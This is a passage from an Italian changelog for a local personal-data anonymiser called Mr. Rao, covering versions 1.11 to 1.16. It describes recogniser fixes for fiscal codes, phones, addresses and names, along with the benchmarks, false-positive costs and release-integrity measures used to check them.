controllo che gira solo sulla macchina di chi sviluppa non è un controllo.

Provato all'indietro sul motore della 1.15.0: il banco segnala
`gu/addresses: da 42 a 0` e `gu/names: da 107 a 0`.

### Inoltre

Nove parole di lessico amministrativo aggiunte all'elenco delle parole
comuni (`area`, `gestione`, `bilancio`, `anagrafe`, `vigilanza`…):
nessuna è un cognome o un nome proprio, quindi non costano richiamo, e
chiudono le etichette di campo che sfuggivano alla guardia sopra.

1002 test, 30 nuovi, 22 dei quali rossi sul commit precedente.

## 1.16.0 — Il cognome che sopravviveva al nome

Terza girata della stessa manopola: **valori diversi**, questa volta sul
resto del pacchetto italiano — i nomi in forme diverse dalla coppia
semplice, gli indirizzi come si scrivono davvero, i codici fiscali che non
sono quelli dell'esempio, i numeri verdi, gli URL, i segreti. Ventisei
forme, duecento valori distinti ciascuna.

Ne sono usciti **tre difetti**, e nessuno riguardava un caso raro.

### «Giulia» non era un nome

Stava nell'elenco delle parole comuni per un motivo solo: fa parte di
**Friuli Venezia Giulia**. Stessa storia per «Emilia», che sta in «Emilia
Romagna». Sono due dei nomi di battesimo più diffusi in Italia, e la
conseguenza era che *«la dott.ssa Giulia Conti»* usciva dal documento
intera: nessuna delle due parole contava come prova.

Toglierle dall'elenco avrebbe fatto sparire mezza Italia amministrativa dai
documenti. Quindi non si è tolto niente: **decide la parola accanto**. Se
prima c'è «Venezia» o dopo c'è «Romagna» è una regione; altrimenti è una
persona. È la regola di sempre — si allenta solo dove c'è qualcosa che
possa dire di no — con il vicino al posto del conto.

### Il cognome sopravviveva al nome

Quarantadue cognomi degli elenchi sono anche parole comuni: Conti, Villa,
Carta, Porta, Valle, Forte, Gentile, Grande, e i nomi di città che in
Italia sono cognomi frequentissimi — Napoli, Ferrara, Messina, Catania,
Salerno, Ragusa, Udine, Brescia.

Dopo un titolo professionale la potatura di coda li buttava via uno per
uno, e *«il dott. Marco Conti»* usciva come *«il dott. NOME Conti»*.
**Il nome tolto e il cognome lasciato**: il modo peggiore di sbagliare,
perché il documento sembra trattato e il dato che identifica la persona è
ancora lì.

Ora l'ultima parola resta se è un cognome noto **e** ha davanti una parola
che negli elenchi c'è davvero. Non basta la forma: serve la coppia.

### Gli indirizzi con l'iniziale puntata non esistevano

*«Via A. Volta 5»*, *«piazza G. Verdi 1»*, *«via C. Colombo 44»*: sulla
carta intestata e sui moduli il nome della strada porta l'iniziale puntata
invece del nome per esteso. Il corpo dell'indirizzo non poteva nemmeno
**cominciare** — pretendeva una lettera minuscola oppure tre maiuscole, e
`A.` non ha né l'una né le altre.

Misurato sul corpus pubblico, dove il motore prima non sostituiva
**nulla**: la correzione tira fuori **41 indirizzi veri** dai dodici numeri
di Gazzetta Ufficiale, fra cui la sede del Ministero dell'ambiente e quella
dell'Istituto Poligrafico stampata su ogni fascicolo. **Zero** falsi
positivi: `via PEC, 30` e `via FTP, 12` restano intatti, perché l'elenco
delle parole-trappola continua a decidere sulla prima parola vera, non
sull'iniziale.

*(Nota aggiunta nella 1.17.0: qui sopra e sotto avevamo scritto «54
documenti a verità zero». I documenti a verità zero sono **42** — i moduli
in bianco italiani e statunitensi. Le dodici Gazzette sono prosa vera, e i
nomi e gli indirizzi ce li hanno davvero: è esattamente per questo che
sono state loro a trovare i difetti.)*

Nella stessa riga: aggiunte le abbreviazioni postali che mancavano
(`P.le`, `L.go`, `V.lo`, `B.go` — c'erano già `V.le`, `P.zza`, `C.so`,
`C.da`), e il suffisso del civico non morde più la parola dopo: su *«via
C. Colombo 44 - Roma»* si prendeva «- Rom» e lasciava indietro una «a».

### Quello che invece andava bene

Ventitré forme su ventisei erano già al 100%: cognomi con la particella
(De, Di, Lo, Della), con l'apostrofo (D'Angelo, Dell'Orto), accentati,
nomi composti, codici fiscali **femminili** (giorno di nascita +40) e di chi
è **nato all'estero** (codice comune `Z…`), partita IVA in entrambe le
grafie, civico con la lettera, indirizzi senza CAP, numeri verdi 800 e
servizi 199, prefissi esteri, URL, JWT, chiavi AWS, importi e date di
nascita.

E un difetto era il banco, non il motore: *«Via S. dei Mille»* non è un
indirizzo — l'iniziale sta al posto del nome di battesimo, e «dei Mille» non
ne ha uno. Ventidue casi su duecento che sembravano una perdita. È lo stesso
errore dei SIN canadesi che cominciavano per zero nella 1.15.0, ed è scritto
nel docstring del generatore perché non si ripeta.

**Costo sui 42 moduli in bianco: zero.** Tutte le sostituzioni nuove stanno
nella prosa vera, e sono indirizzi veri. 979 test, 24 nuovi, 16 dei quali
rossi sul commit precedente.

## 1.15.0 — Cambiare la frase non basta: bisogna cambiare il valore

La 1.14.0 aveva misurato il motore su **una cornice diversa**: lo stesso
dato scritto in posti diversi. Dava 100%, e non era una buona notizia —
usava un solo valore per tipo. Dimostrava che le cornici funzionano, non
che i riconoscitori reggano la varietà dei valori veri.

Girando l'altra manopola — trecento valori distinti per tipo, tutti validi,
con le cifre di controllo calcolate fuori dal motore — sono usciti **due
difetti**. Nessuno dei due è esotico: sono due casi italiani ordinari.

### Il codice fiscale con omocodia non veniva riconosciuto

Quando due persone otterrebbero lo stesso codice fiscale, l'Agenzia delle
Entrate ne cambia una: sostituisce alcune cifre, partendo da destra, con le
lettere **L M N P Q R S T U V**. Sono codici veri, di persone vere, emessi
regolarmente — e la forma «sei lettere, due cifre, una lettera, due
cifre…» non torna più.

Su 300 campioni: **zero riconosciuti**. Il 60% finiva fra i sospetti perché
qualche altro riconoscitore ci inciampava, il **40% spariva del tutto**.

**Il rimedio ammette le lettere dove il codice vuole le cifre, ma pretende
che il conto torni.** È una differenza deliberata rispetto al riconoscitore
normale, che sostituisce anche quando il carattere di controllo non torna
(su un dato personale l'errore va fatto nella direzione prudente). Qui no:
ammettendo lettere in quelle posizioni la forma diventa quasi una parola
qualsiasi di sedici caratteri, e senza l'aritmetica a smentirla si
redigerebbe mezzo documento. È la regola di P3.7 — **si allenta solo dove
c'è un conto che possa dire di no**.

Misurato: su 200 000 token costruiti apposta con la forma esatta, il
carattere di controllo ne respinge il **96,2%**. L'atteso teorico è 1 su 26,
cioè il 3,85%: il filtro fa esattamente il suo mestiere, né più né meno.

### Il telefono con la barra si perdeva

`Tel. 011/7323929` — la forma standard delle carte intestate italiane. Su
300 numeri: **zero riconosciuti**, mentre gli stessi numeri con lo spazio o
il trattino venivano presi. Non era una scelta: la barra mancava
dall'elenco dei separatori.

**Ma ammetterla costa una parola di contesto**, e la ragione è la stessa per
cui in P3.7 i telefoni non erano stati allentati come IBAN e carte: un
recapito **non ha nessuna aritmetica** che possa smentirne la forma.
Misurato: ammettendo la barra senza condizioni, su 3,3 milioni di caratteri
di moduli fiscali comparivano **2 sostituzioni sbagliate** — numerazioni di
colonne come «315 316 317 318 319 /» che la barra saldava in un numero
unico. Chiedendo la parola di contatto il costo torna a **zero**, e il caso
vero non si perde: su una carta intestata la barra viene sempre dopo «Tel.».

**Nella stessa passata la guardia contro le date è stata estesa alla
barra.** Non è un di più: `01/02/2024` è la forma più comune di data in
italiano, e ammettere la barra fra i separatori di un recapito senza
ammetterla lì avrebbe trasformato ogni data in un numero di telefono.

### Cosa invece regge

American Express da 15 cifre, Mastercard, Discover; prefissi fissi da 2, 3 e
4 cifre (02 Milano, 011 Torino, 0121 Pinerolo); IBAN con CIN e ABI
qualsiasi; indirizzi con dieci parole diverse per «via»; cinquanta domini di
posta diversi. **Tutti al 100%.**

Resta a 0% la partita IVA **nuda**, senza prefisso `IT` né contesto fiscale
vicino — ed è documentato: undici cifre da sole sono indistinguibili da un
numero qualsiasi.

### E gli altri riconoscitori? Nessun difetto

La domanda ovvia dopo i due difetti italiani era se il resto avesse lo
stesso problema. **Non ce l'ha.** Venti tipi provati con centinaia di valori
distinti ciascuno — NHS, National Insurance, SSN, ITIN, routing ABA, SIN,
ABN, TFN, **tutti e sei** i formati di codice postale britannico, MRZ,
coordinate BBAN, carta d'identità, patente, passaporto, chiavi e token —
tutti al 100%.

Quattro cose sembravano difetti ed erano il banco, e vale la pena averle
scritte perché sono il modo tipico in cui un banco mente: SIN che iniziano
per 0 o 8 (il Canada non li assegna, e il motore li rifiuta di proposito
con la ragione scritta nel codice); MRZ di una riga sola invece di due; MRZ
di 43 caratteri invece di 44, per la cifra di controllo del numero personale
dimenticata; passaporti con serie che l'Italia non emette. **In tutti e
quattro i casi il motore aveva ragione e il generatore torto.**

Perché qui zero e sul pacchetto italiano due, resta un'ipotesi che vale la
pena scrivere: questi riconoscitori sono nati insieme nella 1.8.0, **con i
vettori di prova presi dalle specifiche degli enti che emettono i
documenti**. Quelli italiani sono cresciuti una versione alla volta.

### I banchi restano

`scripts/bench_varieta.py` e `scripts/bench_varieta_en.py`, più 20 test. È
la terza manopola dopo il degrado dell'immagine e la forma della frase, ed è
la prima che guarda il **valore**.

## 1.14.0 — Il percorso senza OCR non era mai stato misurato

Quasi tutti i numeri che pubblichiamo riguardano le scansioni, dove il
limite principale non è il motore ma l'OCR. Su email, contratti, delibere e
documenti Office il motore è **interamente responsabile** di ciò che trova e
di ciò che perde — e quel percorso non l'aveva mai misurato nessuno.

### Cosa dice la misura

**Falsi positivi: zero.** Su 3,6 milioni di caratteri di moduli
amministrativi veri e in bianco — 27 italiani scaricati dagli enti che li
pubblicano, 15 moduli IRS — **nessuna sostituzione sbagliata**, 42 documenti
su 42 perfetti.

**Forme regolari: 100%.** Dati dal valore noto inseriti in paragrafi veri di
Gazzetta Ufficiale: 520 casi su 520, zero perdite silenziose.

**Forme difficili: 73% redatto, 20% segnalato, 6,7% perso in silenzio.** È
il numero che conta, perché è così che i dati arrivano da un `.docx` o da un
PDF: a gruppi di quattro, in minuscolo, spezzati da un a capo.

### Il difetto che ha trovato

Un indirizzo di posta mandato a capo dall'estrattore — `g.moretti@` a fine
riga, il dominio su quella dopo — era **perso in silenzio in 20 casi su
20**. Non sostituito e nemmeno segnalato: il documento sembrava pulito e non
lo era.

Non è un caso di laboratorio: succede ogni volta che un PDF giustifica il
testo dentro un indirizzo.

**Il rimedio è il più stretto possibile, e c'è una ragione.** In questo
stesso file era già stato pagato un difetto opposto: un riconoscitore di
email che attraversava le righe con `\s*` **si mangiava i paragrafi** — il
conteggio diceva «1 email» e il documento perdeva testo senza dirlo. Quindi:
un solo a capo, solo dopo la chiocciola, e il dominio dopo resta senza spazi
al proprio interno, così non può allungarsi fino alla parola successiva.

In più una stretta di principio: la parte locale non può finire con un
punto (RFC 5322). È ciò che distingue `g.moretti@` da `avv.@`, che era il
falso positivo più frequente.

**Il costo, misurato dove poteva fallire.** Sui corpora veri il pattern
nuovo produce zero candidati — ma quello zero era garantito: in 6,7 milioni
di caratteri ci sono **dieci** chiocciole e **nessuna** a fine riga. La
misura vera è su prosa italiana con una chiocciola forzata in fondo a *ogni*
riga, il caso peggiore possibile: accetta lo **0,026%** delle coppie.

Le perdite silenziose sulle forme difficili scendono dal 13,3% al 6,7%, e
ciò che resta è il limite già dichiarato: un nome fuori da entrambi gli
elenchi, senza titolo né firma né posta accanto.

### Due banchi nuovi, e due buchi che coprono

`scripts/bench_testo.py` e `scripts/bench_formati.py`, entrambi con la
propria controprova, entrambi sotto test nel gate.

Il secondo copre una cosa che nessuno verificava: **un `.xlsx` protegge
quanto un `.docx`?** `verify_build.py` controllava che la conversione
*riuscisse* — riuscire non vuol dire proteggere. Misurato: lo stesso
documento in dieci formati, **otto dati su otto in tutti e dieci**.

### Tre difetti trovati nei banchi, non nel prodotto

Vale scriverli perché sono il motivo per cui i numeri qui sopra reggono.

**Il corpus non era testo grezzo**: erano file già convertiti da Mr. Rao,
intestazione compresa. Il conto diceva 27 sostituzioni sbagliate — una per
documento, un numero troppo regolare per essere vero. Erano tutte
`generator: "Mr. Rao"`, dove `Mr.` è un titolo professionale e `Rao` la
parola maiuscola dopo: **il motore stava redigendo la propria firma**, e
aveva ragione.

**Le opzioni finivano nel nome del file**: `convert_file` le prende come
terzo argomento, il banco le passava come secondo. Ha misurato la
configurazione predefinita per tutta la prima esecuzione, in silenzio.

**Un caso che non poteva fallire**: per l'IBAN a gruppi di quattro il banco
cercava la forma senza spazi dentro un testo che li aveva, quindi risultava
«redatto» anche a motore spento.

Gli ultimi due li ha presi la controprova, che ora è dentro entrambi i
banchi e dentro i test.

## 1.13.0 — La regola che indovinava è stata ritirata

Il motore aveva quattro modi di riconoscere un nome. Tre chiedevano un
riscontro — un titolo davanti, un indirizzo di posta accanto, un nome
proprio riconosciuto. Il quarto no: **due parole maiuscole che non sembrano
parole italiane sono nome e cognome**, e basta.

Era spenta di default dalla 1.7.2. Adesso non c'è più.

### Perché adesso, e non prima

La decisione è arrivata da un lavoro che doveva riguardare altro: la
valutazione di un modello NER per i nomi. Misurando quanto un modello
avrebbe guadagnato, è stato rimisurato anche il costo della regola che
c'era già — **su corpora che non abbiamo scritto noi**, che è la parte che
conta.

Ventisette moduli amministrativi italiani in bianco, scaricati direttamente
da Agenzia delle Entrate, INPS, Agenzia Dogane, Giustizia, Camere di
Commercio: 3,3 milioni di caratteri che **non contengono un solo dato
personale**. Con la regola spenta, 27 sostituzioni sbagliate. Con la regola
accesa, **2 529**. Novantaquattro volte tanto. Su quindici moduli fiscali
statunitensi, da 15 a 622.

Non erano numeri nuovi — i primi (8 904 su venti moduli dell'Agenzia delle
Entrate) risalgono alla 1.7.2. La novità è **da dove vengono**: la prima
volta il banco l'avevamo scritto noi, e un banco scritto in casa contiene
solo le trappole a cui ha pensato chi lo scrive. Stavolta i documenti li
hanno scelti gli enti che li pubblicano.

### Il difetto non era che indovinava

È che **decideva da sola**. Un'euristica che propone e poi deve superare le
prove del motore sarebbe stata utile; una che sostituisce senza nessuna
corroborazione è un'altra cosa. Su un modulo in bianco le prove non
esistono, e quella regola sostituiva lo stesso: «Redditi Persone Fisiche»,
«Quadro RN», «Imposta Lorda».

E tenerla spenta ma disponibile non era neutrale: lasciava in interfaccia
una casella che nessuno doveva accendere. **Una scelta che non va mai fatta
non è una scelta, è una trappola con un'etichetta.**

### Il prezzo, detto per intero

Un nome e cognome che non stanno in nessuno dei due elenchi, **senza**
titolo davanti, **senza** firma e **senza** indirizzo di posta accanto, ora
resta nel documento. E non diventa nemmeno un sospetto, perché il sospetto
richiede almeno un riscontro. Un nome straniero isolato in mezzo a un testo
è il caso tipico.

È una perdita vera, ed è sotto test: se un giorno una regola nuova la
coprisse, il test lo dice e la pagina dei limiti va aggiornata con lui.

**Cosa invece non si perde:** i nomi che stanno negli elenchi restano
riconosciuti, anche scritti tutti in maiuscolo. «Firma: MARIO ROSSI» e «Da:
GIUSEPPE ESPOSITO» spariscono come prima — verificato, non supposto.

### I due interruttori restano accettati

`--name-guess` e `--no-name-guess` non fanno più niente ma **non danno
errore**: sono finiti in script e appunti di chi li usava, e farli fallire
adesso romperebbe quei comandi per comunicare una cosa che è già il
comportamento del programma. Chi scriveva `--no-name-guess` per difendersi
ottiene ancora esattamente ciò che chiedeva, senza doverlo chiedere.

### Il NER, e perché non si fa

La ricerca che ha portato qui aveva un altro scopo, e la sua risposta è
**no, non adesso**. Non per la licenza né per il peso: per il guadagno.

Dentro il vincolo che ci eravamo dati — *il modello propone, le regole
decidono* — il guadagno misurato è **zero**, su 4,5 milioni di caratteri e
con due modelli diversi. La ragione è precisa: nei casi che interessano il
cognome è **una parola sola**, e una parola sola ambigua è difficile per un
modello quanto per un'espressione regolare. Il candidato con licenza pulita
ne recupera il 24% col titolo davanti e lo 0% sulle firme.

Il vincolo però è stato **validato**: senza, lo stesso modello produce 326
sostituzioni sbagliate sui moduli in bianco; con, ne produce 1. Resta
scritto, e vale per qualunque modello si valuti in futuro.

Dettaglio, corpora e numeri in [BACKLOG.md](BACKLOG.md), voce P3.6.

## 1.12.0 — «Nessun modello» non era vero, e «Fatture» non faceva niente

Nessuna di queste cose l'ha chiesta un utente. Sono tutte uscite dal
guardare di nuovo pezzi che davamo per buoni — la promessa scritta in
prima pagina, una voce della tendina, la larghezza della finestra — e
scoprire che tre su tre non stavano in piedi.

### Un dato incollato all'etichetta non veniva nemmeno proposto

Su una scansione degradata l'OCR perde lo spazio: `IBANIT60X05428…`,
`Tel.02 1234567`, il numero di carta attaccato ai puntini di guida. In
tutti quei casi il dato **supererebbe il proprio validatore** — mod-97 e
Luhn tornano — ma il pattern non arrivava a proporlo, perché lo rifiutava
quando preceduto da lettere o da un punto. Perdita silenziosa: nemmeno un
sospetto da rivedere.

**Cosa è stato allentato, e cosa no.** IBAN e carte sì, perché dietro c'è
un'aritmetica capace di smentire la forma: ammessa la parola incollata
davanti, mai una cifra — una cifra vorrebbe dire ritagliare un pezzo da un
numero più lungo. Decide il Luhn.

I telefoni **no**. Un telefono non ha nessun conto che possa smentirne la
forma, quindi allentare lì sarebbe stato allentare e basta. Al suo posto un
pattern che *chiede di più*: la parola di contatto dev'essere prima del
punto (`Tel.02…`).

**Guadagno:** dati persi in silenzio da 60 a 46 su 640 (−23%). Le scansioni
da scanner in ordine non perdono più niente: a 300, 200 e 150 DPI si passa
da 5, 2, 2 a 0, 0, 0. **Costo:** zero falsi positivi a ogni livello, prima e
dopo.

Ma quello zero, la prima volta, **non poteva fallire**: sui documenti usati
per misurarlo i pattern nuovi avevano proposto zero candidati. Un costo di
zero che non aveva modo di essere diverso da zero non è una misura. Rifatto
con banchi capaci di dire di no, compresa una prova a volume su 200 000
candidati che spiega perché sulle carte siamo stati stretti: il mod-97
lascia passare lo 0,01%, il Luhn il 10,03%.

### La promessa «nessun modello» era falsa, e si è spostata dove regge

I documenti pubblici dicevano «nessun modello, nessuna rete neurale». Nel
pacchetto portable di file `.onnx` ce ne sono **quattro**, 33 MB su 165: tre
sono l'OCR, il quarto è magika, il riconoscitore di tipo file di Google, che
MarkItDown si porta dietro e che gira su **ogni conversione**, non solo
sulle scansioni.

Scrivere «nessun modello *AI*» avrebbe peggiorato le cose: un modello OCR
*è* un modello AI, e la frase sarebbe diventata più precisa e più falsa.

La promessa si sposta dove regge, e non si indebolisce: **la decisione** non
passa da nessun modello. L'OCR trasforma pixel in caratteri e si ferma lì;
cosa sia un dato personale lo stabiliscono a valle un'espressione regolare e
un validatore aritmetico. E vale il rovescio, che è la parte utile per chi
lo usa: quando l'OCR legge male, il motore non può decidere bene. Ora il
README lo dice, invece di lasciarlo scoprire a chi ci casca.

### «Fatture / contabili» era il profilo predefinito con un altro nome

Il profilo si distingueva per una cosa sola: spegneva l'euristica del
cognome. Nella **1.7.2** quell'euristica è stata spenta *di default*, e da
quel giorno l'unica differenza è diventata un'istruzione che non istruiva
più niente. Le due voci producevano opzioni **identiche, campo per campo**.

Nessuno se n'è accorto per quattro release, e il perché conta più del
difetto: i test controllavano che ogni profilo fosse coerente **con sé
stesso** e con l'interfaccia, mai che fosse **diverso dagli altri**. Non
esisteva un confronto fra profili, quindi non esisteva modo di vedere un
clone.

Il danno non è tecnico, è di fiducia: chi sceglieva «Fatture» credeva di
aver detto qualcosa al programma, e non aveva detto niente. La voce è stata
tolta, e ora un test confronta fra loro le opzioni **risolte** di tutti i
profili — con accanto un secondo test che ricostruisce il difetto storico,
per dimostrare che il primo può davvero fallire.

### Tablet e finestre strette: 260 pixel di pagina fuori schermo

A 375 px di larghezza la pagina ne occupava 635. Duecentosessanta fuori
schermo e irraggiungibili, perché tagliati.

Il metodo prima del risultato: `overflow-x: hidden` sul body **nasconde** lo
scorrimento invece di risolverlo, e falsa qualunque verifica. Ogni misura è
stata presa azzerandolo temporaneamente e confrontando la larghezza reale
con quella visibile — altrimenti si misura il tappeto, non la polvere.

Trovati e sistemati per la stessa strada: il nome di un allegato da 480 px
dentro un pulsante da 284, i campi del percorso ridotti a 61 px quando ne
servono 345, i due riquadri dei termini **senza nessuna regola CSS**
(bianchi su fondo scuro, ridimensionabili fin fuori dal pannello), aree di
tocco da 19,6 px. Ora sono sopra il minimo di 24×24 richiesto da WCAG 2.2.

### Le pagine pubblicate non possono più invecchiare in silenzio

Il gate che tiene allineati i documenti guardava solo i `.md`. Le landing
HTML no — e infatti una dichiarava ancora la **1.7.2** mentre il programma
era alla 1.11.0: venti release di scarto, e nessun controllo capace di
vederlo. Ottava invariante, con due guardie contro il caso peggiore, cioè un
controllo che diventa verde per sempre perché non trova più niente da
guardare.

### Una pagina in inglese, non una traduzione

La landing inglese non racconta il prodotto italiano in un'altra lingua:
apre sui formati che riguardano chi legge — NHS, National Insurance, SSN,
ITIN, ABA, SIN, ABN, TFN, righe MRZ del passaporto — e porta le prove fatte
in inglese. Ogni paragone con l'italiano è stato tolto: a chi valuta questo
programma non serve sapere cosa fa in un'altra lingua.

### Microsoft Store

Prima pubblicazione inviata e in certificazione, con la 1.11.0. `STORE.md`
è stato riscritto **dopo** averlo fatto davvero, e porta cinque correzioni a
cose che sembravano diverse da come sono — a partire dal fatto che il
pacchetto va caricato *per primo*, perché le lingue della scheda le decide
il manifest.

## 1.11.0 — «Se scansiono una patente, anonimizza qualcosa?»

La domanda l'ha fatta chi lo usa. La risposta, misurata invece che
immaginata, era **zero**: su una patente finta con nome, cognome, data di
nascita, indirizzo e numero, Mr. Rao non toglieva niente.

Questa versione nasce da lì. Sistemando la prima causa se ne sono viste
altre, e alla fine ha cambiato anche il modo in cui il pacchetto viene
consegnato.

### Gli indirizzi erano ciechi sul maiuscolo

Il riconoscitore pretendeva una minuscola dentro il nome della via. «Via
Garibaldi 14» spariva, «VIA GARIBALDI 14» no — e moduli, carte d'identità e
testo uscito dall'OCR sono quasi sempre in maiuscolo. È una causa grossa, e
riguarda tutte le scansioni, non solo le patenti.

Il vincolo era deliberato: escludeva acronimi (PEC, SPA), numeri romani e i
segnaposto già inseriti. Quindi non è stato tolto, è stato **affiancato** da
un ramo maiuscolo con le stesse protezioni.

**Il costo, misurato.** Sul banco a verità zero il ramo nuovo aggiungeva 99
sostituzioni sbagliate. Guardando *cosa* fossero — quasi tutte nomi di
comuni (BORGO SAN LORENZO) e itinerari (STRADA DEL VINO) — la regola è
venuta da sé: in maiuscolo manca il segnale dell'iniziale, quindi **serve
anche il numero civico**. Da +99 a +28.

Strada facendo: «Via XX Settembre» non era riconosciuta in nessuna delle due
grafie, e ce n'è una in quasi ogni città italiana. E l'elenco delle parole
che seguono «via» senza fare un indirizzo è stato ricostruito **contando**
cosa segue davvero la parola-chiave su 1 027 documenti veri, invece di
immaginarlo: lì dentro convivono vie vere (Fermi, Mazzini, Marconi) e usi
tecnici (via USB, via SSH). Solo i secondi sono entrati — aggiungere un
toponimo avrebbe reso il riconoscitore cieco proprio sugli indirizzi.

### Documenti d'identità: carta, patente, passaporto

Prima non c'era nessun riconoscitore. Ora ce n'è uno, con un interruttore
proprio (`documenti`), e formati verificati e non ricordati: CIE
`AA00000AA`, passaporto `YA`/`YB`/`TA` più sette cifre, patente per
provincia, duplicati UCO.

**Il metodo di casa qui si ferma a metà, ed è scritto nel codice invece che
nascosto.** «Il pattern propone, il validatore decide» presuppone che ci sia
qualcosa da validare: nessuno di questi tre numeri ha una cifra di controllo
pubblica — la patente ne ha una, l'algoritmo non è pubblicato. E le forme
sono comunissime: identiche a sigle di protocollo, codici gara, riferimenti
catastali. Da sole farebbero strage su un verbale.

Al posto del validatore c'è il **contesto obbligatorio**: si sostituisce
solo se accanto c'è scritto di che documento si tratta. Senza contesto la
forma diventa un **sospetto** — il documento resta intero e chi rilegge sa
dove guardare. Su oltre cento documenti a verità zero: zero sostituzioni sbagliate.

### I moduli numerano le colonne, non telefonano

Sui documenti italiani veri la prima voce dei falsi positivi era il
riconoscitore dei telefoni che leggeva le intestazioni di tabella: `00 1 2 3
4 5 6 7 8`, `33 34 35 36 37`, `05-06-07-08-09`.

Tre regole, ciascuna con una ragione propria: una numerazione di colonne
**conta** (i gruppi crescono di uno alla volta, e nessun recapito si scrive
così); nessun indicativo di Paese comincia per zero; né la decade mobile
`30x` né il distretto `00x` esistono in Italia. Una parola di contesto
davanti — «tel.» — vince comunque sulla forma.

Misurato sul corpus: sui moduli italiani in bianco i falsi positivi dei
telefoni passano **da 62 a 19**, sulle Gazzette **da 575 a 212**. Il
richiamo sui recapiti veri resta 4/4.

### L'email offuscata non si mangia più il paragrafo dopo

Su «… \[punto] it.\n\nRecapiti: cell. 335 123 4567» il riconoscitore
divorava il punto finale, i due ritorni a capo e la parola dopo: «Recapiti»
spariva.

Non era un falso positivo su un dato personale: era **testo del documento
che spariva senza essere segnalato**. Il conteggio diceva «1 email», quindi
chi legge non aveva motivo di sospettare che mancasse anche una riga.
Toglie e tace — per un programma che esiste per far vedere cosa è stato
tolto, è il modo peggiore di sbagliare. (issue #3)

### Le due liste dello studio: nascondi sempre, non toccare mai

Il motore decide con regole generali, ma i nomi che ricorrono in ogni
pratica li conosce solo chi converte. Fino a ieri l'unica leva era spegnere
un riconoscitore intero, che è un martello per un chiodo.

Due caselle nel pannello privacy, `--sempre` e `--mai` da riga di comando.
**Non sono simmetriche**, ed è la cosa che conta: «sempre» aggiunge un
riconoscitore, il termine diventa `{{TERM}}`; «mai» mette il termine al
riparo da **tutti** i riconoscitori, compresi quelli che non sapresti di
dover spegnere, e non lascia nemmeno un sospetto.

La protezione è fatta togliendo il termine dal testo e rimettendolo alla
fine, non chiedendo a ogni riconoscitore di consultare la lista: la seconda
via lascia scoperto il riconoscitore che ci si dimentica di modificare.

Le liste restano scritte nel `localStorage` del browser: **è l'unica cosa
che Mr. Rao salva**, ed è dichiarato nei due README. Una lista di clienti da
riscrivere ogni volta non la userebbe nessuno, e una funzione che non si usa
non protegge niente.

### L'anteprima rende il Markdown per davvero

Era una sequenza di sostituzioni che non sapeva fare né liste annidate né
tabelle — cioè proprio ciò che esce da un PDF. Ora c'è un renderer in
`static/js/markdown.js`: titoli, liste con annidamento per rientro, tabelle
GFM con allineamenti, blocchi recintati, citazioni, caselle di spunta.

**Scritto in casa invece di prendere una libreria**, e la ragione non è il
peso: un renderer generico rende anche le immagini remote, e un `<img src>`
verso l'esterno sarebbe una chiamata di rete partita dal documento che stai
anonimizzando — la promessa «zero cloud» caduta proprio mentre guardi il
risultato della redazione. Qui un'immagine resta una didascalia, e i
collegamenti passano solo con schemi ammessi. Siccome quella promessa non
deve dipendere da una sola espressione regolare scritta da noi, la CSP
dichiara anche `img-src 'self' data: blob:`.

### Quanto regge su una scansione, con i numeri

`scripts/bench_scansioni.py`: otto documenti con dati inventati — cifre di
controllo calcolate **dentro il banco**, con un'implementazione indipendente
da quella del motore e confrontata con i vettori pubblicati ISO 13616 e
Luhn — stampati, degradati in modo controllato, passati per l'OCR e
l'anonimizzatore veri. Ripetibile (stessa impronta su tre esecuzioni) e con
due controprove che lo vedono fallire.

**La risposta è che non è il DPI.** Fra 300 e 100 DPI su una scansione
pulita la copertura non peggiora. Il crollo è sulla **fotocopia sbiadita a
200 DPI**, un documento che a occhio si legge benissimo, dove il **39% dei
dati resta in chiaro**.

E quel resto è quasi tutto silenzioso. `PRIVACY.md` diceva «quello che resta
viene segnalato, non sostituito»: la misura dice di no — i sospetti ne
intercettano 0 su 5 sulle scansioni pulite e 4 su 29 sulla fotocopia. **La
riga è stata riscritta con i numeri accanto**, perché una promessa che la
misura non regge è peggio di nessuna promessa.

Una buona notizia: sui documenti di controllo a verità zero le sostituzioni
sbagliate sono **zero a ogni livello di degrado**, anche quando l'OCR
restituisce spazzatura. Il filtro non compensa redigendo tutto.

Il banco resta aperto a metà, e sta scritto: la carta è simulata, non vera.

### Tre difetti di concorrenza, tutti visti rossi prima della correzione

Le due parti concorrenti del programma non avevano un test dedicato.

**Un avanzamento resuscitava un lavoro annullato**: chi premeva Annulla
vedeva la barra ripartire, per tutto il tempo che mancava alla fine della
fase — su un PDF con OCR non è un lampo. **Riavviare la sorveglianza durante
una conversione lasciava due thread per sempre**, perché il segnale di stop
era condiviso: due cartelle sorvegliate al posto di una. **Un annullamento
in coda veniva sovrascritto dal worker.**

Niente `sleep` come sincronizzazione: solo Event e attese con condizione. Un
test concorrente ballerino è peggio di nessun test.

### Dal tasto destro, un fallimento lascia una traccia leggibile dopo

`--attendi` copriva solo il caso in cui c'è qualcuno davanti allo schermo
*e* una console vera. Ora un fallimento scrive una riga in
`%LOCALAPPDATA%\Mr Rao`, e il menu contestuale passa per `cmd /c "… ||
pause"` — così la finestra resta anche se il processo muore prima di
arrivare a Python.

**Un registro, su un programma che esiste per non far girare i dati
personali, è esso stesso un dato.** Quindi: c'è data, estensione, dimensione
approssimativa e motivo; **non** c'è il nome del documento, il percorso, la
cartella né il contenuto. Una riga sola riscritta ogni volta, non una
cronologia. Una conversione riuscita non scrive niente. `MR_RAO_TRACCIA=0`
lo spegne.

### Il pacchetto dice da dove viene

`SHA256SUMS.txt` accanto agli archivi, nel formato di `sha256sum`. **Non è
una firma e non va spacciata per tale**: chi può sostituire lo zip può
sostituire anche le impronte. Vale contro uno scaricamento troncato o un
mirror qualsiasi; contro chi controlla la pagina non vale niente.

La cosa più forte è un'altra: il pacchetto ora è **firmato da Sigstore**
dallo stesso workflow che lo costruisce. Non è Authenticode e non toglie
l'avviso di SmartScreen — quello richiede un certificato a pagamento, ed è
una scelta di costo dichiarata. Risponde a un'altra domanda: *questo file è
uscito da quel repository, da quel commit, da quella build.*

```bash
gh attestation verify MrRao-Portable.zip --repo AntonioRao/mr-rao
```

Meglio di una firma GPG per un motivo preciso: la debolezza di GPG non è la
riservatezza della chiave pubblica, è che chi verifica deve procurarsela e
sapere che è davvero la tua. Qui l'identità è quella di GitHub Actions, non
si fabbrica, e la firma finisce in Rekor, che è append-only. Nessuna chiave
privata da custodire, quindi nessuna che possa essere rubata.

**Le licenze, che erano il vero ostacolo.** Il workflow disattivava il
controllo, perché su un runner pulito pip risolve versioni diverse da quelle
della macchina del manutentore. Andava bene finché quel lavoro serviva a
